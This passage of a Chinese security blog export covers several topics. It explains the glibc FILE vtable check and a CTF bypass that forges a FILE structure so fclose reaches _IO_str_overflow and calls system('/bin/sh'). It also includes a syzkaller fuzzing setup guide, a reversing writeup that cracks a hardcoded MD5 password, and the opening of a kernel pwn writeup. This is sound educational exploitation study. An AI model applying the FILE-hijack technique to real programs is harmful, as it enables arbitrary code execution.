<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">_IO_new_fclose (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> status;</span><br><span class="line"></span><br><span class="line">  CHECK_FILE(fp, EOF);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> SHLIB_COMPAT (libc, GLIBC_2_0, GLIBC_2_1)</span></span><br><span class="line">  <span class="comment">/* We desperately try to help programs which are using streams in a</span></span><br><span class="line"><span class="comment">     strange way and mix old and new functions.  Detect old streams</span></span><br><span class="line"><span class="comment">     here.  */</span></span><br><span class="line">  <span class="keyword">if</span> (_IO_vtable_offset (fp) != <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> _IO_old_fclose (fp);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* First unlink the stream.  */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_IS_FILEBUF)</span><br><span class="line">    _IO_un_link ((struct _IO_FILE_plus *) fp);</span><br><span class="line"></span><br><span class="line">  _IO_acquire_lock (fp);</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_IS_FILEBUF)</span><br><span class="line">    status = _IO_file_close_it (fp);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    status = fp-&gt;_flags &amp; _IO_ERR_SEEN ? <span class="number">-1</span> : <span class="number">0</span>;</span><br><span class="line">  _IO_release_lock (fp);</span><br><span class="line">  _IO_FINISH (fp);	<span class="comment">//这个是重点</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_mode &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* This stream has a wide orientation.  This means we have to free</span></span><br><span class="line"><span class="comment">	 the conversion functions.  */</span></span><br><span class="line">      <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *<span class="title">cc</span> = <span class="title">fp</span>-&gt;_<span class="title">codecvt</span>;</span></span><br><span class="line"></span><br><span class="line">      __libc_lock_lock (__gconv_lock);</span><br><span class="line">      __gconv_release_step (cc-&gt;__cd_in.__cd.__steps);</span><br><span class="line">      __gconv_release_step (cc-&gt;__cd_out.__cd.__steps);</span><br><span class="line">      __libc_lock_unlock (__gconv_lock);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (_IO_have_backup (fp))</span><br><span class="line">	_IO_free_backup_area (fp);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (fp != _IO_stdin &amp;&amp; fp != _IO_stdout &amp;&amp; fp != _IO_stderr)</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags = <span class="number">0</span>;</span><br><span class="line">      <span class="built_in">free</span>(fp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到不管<code>fp-&gt;flag</code>是多少，总会执行<code>_IO_FINISH(fp)</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_FINISH(FP) JUMP1 (__finish, FP, 0)</span></span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> JUMP1(FUNC, THIS, X1) (_IO_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1)</span></span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># <span class="meta-keyword">define</span> _IO_JUMPS_FUNC(THIS) (IO_validate_vtable (_IO_JUMPS_FILE_plus (THIS)))</span></span><br></pre></td></tr></table></figure>

<p>这里的<code>IO_validate_vtable</code>就是对vtable的检查</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *</span></span><br><span class="line"><span class="class"><span class="title">IO_validate_vtable</span> (<span class="title">const</span> <span class="title">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="comment">/* Fast path: The vtable pointer is within the __libc_IO_vtables</span></span><br><span class="line"><span class="comment">     section.  */</span></span><br><span class="line">  <span class="keyword">uintptr_t</span> section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;	<span class="comment">//要求</span></span><br><span class="line">  <span class="keyword">uintptr_t</span> ptr = (<span class="keyword">uintptr_t</span>) vtable;</span><br><span class="line">  <span class="keyword">uintptr_t</span> offset = ptr - (<span class="keyword">uintptr_t</span>) __start___libc_IO_vtables;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (offset &gt;= section_length))</span><br><span class="line">    <span class="comment">/* The vtable pointer is not in the expected section.  Use the</span></span><br><span class="line"><span class="comment">       slow path, which will terminate the process if necessary.  */</span></span><br><span class="line">    _IO_vtable_check ();</span><br><span class="line">  <span class="keyword">return</span> vtable;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个检查就限制了vtable的指针必须在<code>__start___libc_IO_vtables</code>和<code>__stop___libc_IO_vtables</code>之间，我们就不能随意修改vtable的指针了</p>
<h1 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h1><p>在<code>__stop___libc_IO_vtables</code> 和 <code>__start___libc_IO_vtables</code>之间除了我们iofile结构体本身初始化所带的跳转表<code>_IO_file_jumps</code>之外，还有另一个跳转表<code>_IO_str_jumps</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_str_jumps</span> <span class="title">libio_vtable</span> =</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT(finish, _IO_str_finish),</span><br><span class="line">  JUMP_INIT(overflow, _IO_str_overflow),</span><br><span class="line">  JUMP_INIT(underflow, _IO_str_underflow),</span><br><span class="line">  JUMP_INIT(uflow, _IO_default_uflow),</span><br><span class="line">  JUMP_INIT(pbackfail, _IO_str_pbackfail),</span><br><span class="line">  JUMP_INIT(xsputn, _IO_default_xsputn),</span><br><span class="line">  JUMP_INIT(xsgetn, _IO_default_xsgetn),</span><br><span class="line">  JUMP_INIT(seekoff, _IO_str_seekoff),</span><br><span class="line">  JUMP_INIT(seekpos, _IO_default_seekpos),</span><br><span class="line">  JUMP_INIT(setbuf, _IO_default_setbuf),</span><br><span class="line">  JUMP_INIT(sync, _IO_default_sync),</span><br><span class="line">  JUMP_INIT(doallocate, _IO_default_doallocate),</span><br><span class="line">  JUMP_INIT(read, _IO_default_read),</span><br><span class="line">  JUMP_INIT(write, _IO_default_write),</span><br><span class="line">  JUMP_INIT(seek, _IO_default_seek),</span><br><span class="line">  JUMP_INIT(close, _IO_default_close),</span><br><span class="line">  JUMP_INIT(stat, _IO_default_stat),</span><br><span class="line">  JUMP_INIT(showmanyc, _IO_default_showmanyc),</span><br><span class="line">  JUMP_INIT(imbue, _IO_default_imbue)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>其中的<code>_IO_str_overflow</code>有我们可以利用的地方</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">_IO_str_overflow (_IO_FILE *fp, <span class="keyword">int</span> c)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> flush_only = c == EOF;</span><br><span class="line">  _IO_size_t pos;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_WRITES)<span class="comment">// pass</span></span><br><span class="line">      <span class="keyword">return</span> flush_only ? <span class="number">0</span> : EOF;</span><br><span class="line">  <span class="keyword">if</span> ((fp-&gt;_flags &amp; _IO_TIED_PUT_GET) &amp;&amp; !(fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">      fp-&gt;_IO_write_ptr = fp-&gt;_IO_read_ptr;</span><br><span class="line">      fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_end;</span><br><span class="line">    &#125;</span><br><span class="line">  pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base;</span><br><span class="line">  <span class="keyword">if</span> (pos &gt;= (_IO_size_t) (_IO_blen (fp) + flush_only))<span class="comment">// should in </span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_USER_BUF) <span class="comment">/* not allowed to enlarge */</span> <span class="comment">// pass</span></span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">char</span> *new_buf;</span><br><span class="line">      <span class="keyword">char</span> *old_buf = fp-&gt;_IO_buf_base;</span><br><span class="line">      <span class="keyword">size_t</span> old_blen = _IO_blen (fp);</span><br><span class="line">      _IO_size_t new_size = <span class="number">2</span> * old_blen + <span class="number">100</span>;</span><br><span class="line">      <span class="keyword">if</span> (new_size &lt; old_blen)<span class="comment">//pass 一般会通过</span></span><br><span class="line">        <span class="keyword">return</span> EOF;</span><br><span class="line">      new_buf</span><br><span class="line">        = (<span class="keyword">char</span> *) (*((_IO_strfile *) fp)-&gt;_s._allocate_buffer) (new_size);<span class="comment">//target [fp+0xe0]</span></span><br><span class="line">      <span class="keyword">if</span> (new_buf == <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="comment">/*      __ferror(fp) = 1; */</span></span><br><span class="line">          <span class="keyword">return</span> EOF;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="keyword">if</span> (old_buf)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">memcpy</span> (new_buf, old_buf, old_blen);</span><br><span class="line">          (*((_IO_strfile *) fp)-&gt;_s._free_buffer) (old_buf);</span><br><span class="line">          <span class="comment">/* Make sure _IO_setb won't try to delete _IO_buf_base. */</span></span><br><span class="line">          fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="built_in">memset</span> (new_buf + old_blen, <span class="string">'\0'</span>, new_size - old_blen);</span><br><span class="line"></span><br><span class="line">      _IO_setb (fp, new_buf, new_buf + new_size, <span class="number">1</span>);</span><br><span class="line">      fp-&gt;_IO_read_base = new_buf + (fp-&gt;_IO_read_base - old_buf);</span><br><span class="line">      fp-&gt;_IO_read_ptr = new_buf + (fp-&gt;_IO_read_ptr - old_buf);</span><br><span class="line">      fp-&gt;_IO_read_end = new_buf + (fp-&gt;_IO_read_end - old_buf);</span><br><span class="line">      fp-&gt;_IO_write_ptr = new_buf + (fp-&gt;_IO_write_ptr - old_buf);</span><br><span class="line"></span><br><span class="line">      fp-&gt;_IO_write_base = new_buf;</span><br><span class="line">      fp-&gt;_IO_write_end = fp-&gt;_IO_buf_end;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!flush_only)</span><br><span class="line">    *fp-&gt;_IO_write_ptr++ = (<span class="keyword">unsigned</span> <span class="keyword">char</span>) c;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_read_end)</span><br><span class="line">    fp-&gt;_IO_read_end = fp-&gt;_IO_write_ptr;</span><br><span class="line">  <span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中有一段</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">new_buf = (<span class="keyword">char</span> *) (*((_IO_strfile *) fp)-&gt;_s._allocate_buffer) (new_size);</span><br></pre></td></tr></table></figure>

<p>其中</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_strfile_</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_streambuf</span> _<span class="title">sbf</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_str_fields</span> _<span class="title">s</span>;</span></span><br><span class="line">&#125; _IO_strfile;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_streambuf</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> _<span class="title">f</span>;</span></span><br><span class="line">  <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_str_fields</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  _IO_alloc_type _allocate_buffer;</span><br><span class="line">  _IO_free_type _free_buffer;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>也就是说，换到<code>_IO_FILE</code>结构体中，<code>_allocate_buffer</code>就位于vtable之后</p>
<p>而<code>new_size = 2 * (fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base)+ 100;</code></p>
<h1 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    JUMP_FIELD(<span class="keyword">size_t</span>, __dummy);</span><br><span class="line">    JUMP_FIELD(<span class="keyword">size_t</span>, __dummy2);</span><br><span class="line">    JUMP_FIELD(_IO_finish_t, __finish);</span><br><span class="line">    JUMP_FIELD(_IO_overflow_t, __overflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __underflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __uflow);</span><br><span class="line">    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);</span><br><span class="line">    <span class="comment">/* showmany */</span></span><br><span class="line">    JUMP_FIELD(_IO_xsputn_t, __xsputn);</span><br><span class="line">    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);</span><br><span class="line">    JUMP_FIELD(_IO_seekoff_t, __seekoff);</span><br><span class="line">    JUMP_FIELD(_IO_seekpos_t, __seekpos);</span><br><span class="line">    JUMP_FIELD(_IO_setbuf_t, __setbuf);</span><br><span class="line">    JUMP_FIELD(_IO_sync_t, __sync);</span><br><span class="line">    JUMP_FIELD(_IO_doallocate_t, __doallocate);</span><br><span class="line">    JUMP_FIELD(_IO_read_t, __read);</span><br><span class="line">    JUMP_FIELD(_IO_write_t, __write);</span><br><span class="line">    JUMP_FIELD(_IO_seek_t, __seek);</span><br><span class="line">    JUMP_FIELD(_IO_close_t, __close);</span><br><span class="line">    JUMP_FIELD(_IO_stat_t, __stat);</span><br><span class="line">    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);</span><br><span class="line">    JUMP_FIELD(_IO_imbue_t, __imbue);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>由于fclose会调用<code>vtable-&gt;__finish</code>的函数指针，那么如果我们把vtable改为<code>_IO_str_jumps-8</code>即可让其调用<code>_IO_str_overflow</code>函数</p>
<p>我们将伪造的<code>IO_FILE</code>结构体中vtable之后的八个字节填充为system函数的地址，<code>_IO_str_overflow</code>就会调用它，接下来我们只需要将<code>new_size</code>指向”/bin/sh”字符串即可，方法是伪造<code>_IO_buf_end</code>的地址为<code>(addr_of_binsh-100)/2</code></p>
<p>对了，还有，<code>fp-&gt;_flags &amp; _IO_NO_WRITES</code>要为0，因为在<code>_IO_str_overflow</code>中有这么个检查</p>
]]></content>
      <categories>
        <category>学习日记</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>syzkaller初步使用</title>
    <url>/2020/03/24/syzkaller%E5%88%9D%E6%AD%A5%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<p>第一次真正使用fuzz，与我对fuzz的印象不同，syzkaller是不需要我提供样例输入的，这就让人很舒服</p>
<a id="more"></a>

<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p>首先安装go，由于我使用的linux系统是manjaro，所以直接使用<code>sudo pacman -S go</code>即可完成安装</p>
<p>然后运行如下指令</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">go get -u -d github.com/google/syzkaller/...</span><br><span class="line">cd gopath/src/github.com/google/syzkaller/</span><br><span class="line">make</span><br></pre></td></tr></table></figure>

<p>对于manjaro，gopath位于当前用户的家目录内</p>
<p>然后要做镜像，在<code>gopath/src/github.com/google/syzkaller/tools/</code>目录中有一个<code>create-image.sh</code>，其中用到了<code>debootstrap</code>可能需要额外安装一下，再一个就是要给他使用国内源，不然会很慢</p>
<p>使用国内源的方法是，使用编辑器编辑该脚本文件，在<code>debootstrap</code>的那条指令的最后添加一个<code>http://mirrors.163.com/debian/</code>参数</p>
<p>最后运行该文件，会在当前文件夹得到一个chroot的目录、stretch.img以及stretch.id_rsa 和stretch.id_rsa.pub用来进行ssh连接</p>
<p>chroot目录的作用是生成stretch.img，因此可以删除</p>
<p>接下来是内核的编译，下载内核</p>
<p>首先在内核目录执行</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">make defconfig</span><br><span class="line">make kvmconfig</span><br></pre></td></tr></table></figure>

<p>然后修改当前目录下的<code>.config</code>文件，把下面链接中说的配置改上去</p>
<p><a href="https://github.com/google/syzkaller/blob/master/docs/linux/kernel_configs.md" target="_blank" rel="noopener">https://github.com/google/syzkaller/blob/master/docs/linux/kernel_configs.md</a></p>
<p>然后直接make即可</p>
<h1 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h1><p>在syzkaller文件夹下新建一个workdir，里面新建一个文件my.cfg</p>
<p>文件内容如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;http&quot;: &quot;127.0.0.1:56741&quot;,</span><br><span class="line">    &quot;target&quot;: &quot;linux/amd64&quot;,</span><br><span class="line">    &quot;workdir&quot;: &quot;path/to/syzkaller/workdir&quot;,</span><br><span class="line">    &quot;kernel_obj&quot;: &quot;path/to/vmlinux&quot;,</span><br><span class="line">    &quot;image&quot;: &quot;path/to/stretch.img&quot;,</span><br><span class="line">    &quot;sshkey&quot;: &quot;path/to/stretch.id_rsa&quot;,</span><br><span class="line">    &quot;syzkaller&quot;: &quot;path/to/syzkaller&quot;,</span><br><span class="line">    &quot;procs&quot;: 4,</span><br><span class="line">    &quot;type&quot;: &quot;qemu&quot;,</span><br><span class="line">    &quot;vm&quot;: &#123;</span><br><span class="line">        &quot;count&quot;: 4,</span><br><span class="line">        &quot;kernel&quot;: &quot;path/to/bzImage&quot;,</span><br><span class="line">        &quot;cpu&quot;: 2,</span><br><span class="line">        &quot;mem&quot;: 2048</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后在该目录执行<code>../bin/syz-manager -config=./my.cfg</code>就开始fuzz了</p>
<p>浏览器进入<code>http://127.0.0.1:56741</code>就可以监视fuzz的运行状态以及fuzz的成果</p>
]]></content>
      <categories>
        <category>fuzz</category>
      </categories>
      <tags>
        <tag>kernel</tag>
      </tags>
  </entry>
  <entry>
    <title>#kksctf open 2019 Secret IMAGination</title>
    <url>/2020/03/18/kksctf-open-2019-Secret-IMAGination/</url>
    <content><![CDATA[<p>又一种没见过的题目，只提供了iso文件</p>
<p>参考：<a href="https://github.com/kksctf/kksctf-open-19/tree/master/Reverse/Secret%20IMAGination" target="_blank" rel="noopener">https://github.com/kksctf/kksctf-open-19/tree/master/Reverse/Secret%20IMAGination</a></p>
<p>文件：<a href="https://github.com/DayJun/Blogs/tree/master/Articles/kksctf-2019%20Secret%20IMAGination" target="_blank" rel="noopener">Github</a></p>
<a id="more"></a>

<p>将iso文件解压</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&apos;[BOOT]&apos;    boot.cat   isolinux.bin   isolinux.cfg   kernel.gz*   ldlinux.c32   rootfs.gz</span><br></pre></td></tr></table></figure>

<p>得到这些文件，其中对我们有用的文件是<code>kernel.gz, rootfs.gz</code></p>
<h1 id="rootfs-gz"><a href="#rootfs-gz" class="headerlink" title="rootfs.gz"></a>rootfs.gz</h1><p>将其解压，打开其中的init文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line">dmesg -n 1</span><br><span class="line">mount -t devtmpfs none /dev</span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">setsid cttyhack sh -c '/bin/task &amp;&amp; sleep 4 ; sleep 1 ; poweroff -f'</span><br></pre></td></tr></table></figure>

<p>程序在启动时执行了<code>/bin/task</code>，用分析它</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v4; <span class="comment">// ST30_8</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// ST20_4</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v6; <span class="comment">// ST24_4</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">calloc</span>(<span class="number">200L</span>L, <span class="number">1L</span>L, envp);</span><br><span class="line">  v4 = <span class="built_in">calloc</span>(<span class="number">21L</span>L, <span class="number">1L</span>L, v3);</span><br><span class="line">  <span class="built_in">printf</span>((<span class="keyword">unsigned</span> __int64)<span class="string">"Enter password: "</span>);</span><br><span class="line">  _isoc99_scanf((<span class="keyword">unsigned</span> __int64)<span class="string">"%20s"</span>);</span><br><span class="line">  v5 = (<span class="keyword">unsigned</span> __int64)j_strlen_ifunc(v4, v4);</span><br><span class="line">  v6 = open64(<span class="string">"/pass"</span>, <span class="number">577</span>, (<span class="keyword">char</span>)argv);</span><br><span class="line">  write(v6, v4, v5);</span><br><span class="line">  close(v6);</span><br><span class="line">  __asm &#123; syscall; LINUX - &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.text:0000000000401D38                 mov     edx, 539h</span><br><span class="line">.text:0000000000401D3D                 nop</span><br><span class="line">.text:0000000000401D3E                 mov     rax, rdx</span><br><span class="line">.text:0000000000401D41                 syscall                 ; LINUX -</span><br><span class="line">.text:0000000000401D43                 mov     rdx, rax</span><br><span class="line">.text:0000000000401D46                 mov     [rbp+var_8], rdx</span><br><span class="line">.text:0000000000401D4A                 cmp     [rbp+var_8], 0</span><br><span class="line">.text:0000000000401D4F                 jnz     short loc_401D5D</span><br><span class="line">.text:0000000000401D51                 lea     rdi, aWrongPassword ; &quot;Wrong password!&quot;</span><br><span class="line">.text:0000000000401D58                 call    puts</span><br><span class="line">.text:0000000000401D5D</span><br><span class="line">.text:0000000000401D5D loc_401D5D:                             ; CODE XREF: main+DA↑j</span><br><span class="line">.text:0000000000401D5D                 cmp     [rbp+var_8], 0</span><br><span class="line">.text:0000000000401D62                 setz    al</span><br><span class="line">.text:0000000000401D65                 movzx   eax, al</span><br><span class="line">.text:0000000000401D68                 leave</span><br><span class="line">.text:0000000000401D69                 retn</span><br></pre></td></tr></table></figure>

<p>程序获取我们的输入，然后写入pass文件，最后调用了编号为0x539的系统调用，该调用应该是作者加的</p>
<h1 id="kernel-gz"><a href="#kernel-gz" class="headerlink" title="kernel.gz"></a>kernel.gz</h1><p>该文件其实就和<code>bzImage</code>是同一类型，所以将其解压</p>
<p>猜测该系统调用会打开<code>/pass</code>文件，所以先用<code>ida</code>打开解压出来的二进制文件，然后搜索<code>/pass</code>字符串，找到一处函数</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.text:FFFFFFFF81372346                 mov     r8d, <span class="number">1</span></span><br><span class="line">.text:FFFFFFFF8137234C                 mov     rdx, offset dword_FFFFFFFF824A5850</span><br><span class="line">.text:FFFFFFFF81372353                 mov     rsi, offset qword_FFFFFFFF82733DD8</span><br><span class="line">.text:FFFFFFFF8137235A                 mov     rdi, offset aPass ; <span class="string">"/pass"</span></span><br><span class="line">.text:FFFFFFFF81372361                 call    kernel_read_file_from_path</span><br><span class="line">.text:FFFFFFFF81372366                 mov     edx, cs:dword_FFFFFFFF824A5850</span><br><span class="line">.text:FFFFFFFF8137236C                 mov     rsi, cs:qword_FFFFFFFF82733DD8</span><br><span class="line">.text:FFFFFFFF81372373                 mov     rdi, offset unk_FFFFFFFF82733DE0</span><br><span class="line">.text:FFFFFFFF8137237A                 call    md5_hash</span><br><span class="line">.text:FFFFFFFF8137237F                 mov     edx, <span class="number">10</span>h</span><br><span class="line">.text:FFFFFFFF81372384                 mov     rsi, offset unk_FFFFFFFF82733DE0</span><br><span class="line">.text:FFFFFFFF8137238B                 mov     rdi, offset byte_FFFFFFFF82046780</span><br><span class="line">.text:FFFFFFFF81372392                 call    <span class="built_in">strncmp</span></span><br><span class="line">.text:FFFFFFFF81372397                 test    eax, eax</span><br><span class="line">.text:FFFFFFFF81372399                 jz      <span class="keyword">short</span> loc_FFFFFFFF813723AA</span><br><span class="line">.text:FFFFFFFF8137239B                 mov     cs:qword_FFFFFFFF82733DC0, <span class="number">0</span></span><br><span class="line">.text:FFFFFFFF813723A6                 xor     eax, eax</span><br><span class="line">.text:FFFFFFFF813723A8</span><br><span class="line">.text:FFFFFFFF813723A8 loc_FFFFFFFF813723A8:                   ; CODE XREF: sys_flag+<span class="number">187</span>↓j</span><br><span class="line">.text:FFFFFFFF813723A8                 pop     rbp</span><br><span class="line">.text:FFFFFFFF813723A9                 retn</span><br></pre></td></tr></table></figure>

<p>这个文件是无符号的，对于函数名称我是在<code>/proc/kallsyms</code>文件中查询函数地址而得到的</p>
<p>这里就很清楚了，它把<code>/pass</code>中的字符串用md5加密，然后与一串硬编码的哈希值比对，如果成功会跳到成功的分支，所以将<code>byte_FFFFFFFF82046780</code>中的哈希值提取出来，对其进行解密</p>
<p><code>16fb67d82414db7d1c2ab1ed965dc754: diviz_)(159$=*@</code></p>
<p>之后将解出来的字符串输进去，就会得到flag</p>
]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>kernel</tag>
      </tags>
  </entry>
  <entry>
    <title>CONFidence2019 p4fmt</title>
    <url>/2020/03/17/CONFidence2019-p4fmt/</url>
    <content><![CDATA[<p>挺有意思的内核pwn</p>
<p>参考：<a href="https://github.com/OAlienO/OAlienO/blob/705fd61f73703eba65732abcf87cfdbf2644108a/docs/security/pwn/writeups/p4fmt.md" target="_blank" rel="noopener">https://github.com/OAlienO/OAlienO/blob/705fd61f73703eba65732abcf87cfdbf2644108a/docs/security/pwn/writeups/p4fmt.md</a></p>
<p><a href="https://amritabi0s.wordpress.com/2019/03/19/confidence-ctf-p4fmt-write-up/" target="_blank" rel="noopener">https://amritabi0s.wordpress.com/2019/03/19/confidence-ctf-p4fmt-write-up/</a></p>
<p><a href="https://github.com/yuawn/CTF/tree/master/2019/confidence_teaser/p4fmt" target="_blank" rel="noopener">https://github.com/yuawn/CTF/tree/master/2019/confidence_teaser/p4fmt</a></p>
<p>文件：<a href="https://github.com/DayJun/Blogs/tree/master/Articles/CONFidence2019%20p4fmt" target="_blank" rel="noopener">Github</a></p>
<a id="more"></a>

<h1 id="p4fmt-ko"><a href="#p4fmt-ko" class="headerlink" title="p4fmt.ko"></a>p4fmt.ko</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__<span class="function">int64 <span class="title">p4fmt_init</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _register_binfmt(&amp;p4format, <span class="number">1L</span>L);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>_register_binfmt</code>函数用来向内核注册一个可执行文件的格式，elf文件也是通过这个方法在内核中注册的</p>
<p><code>p4format</code>是一个<code>linux_binfmt</code>结构体</p>
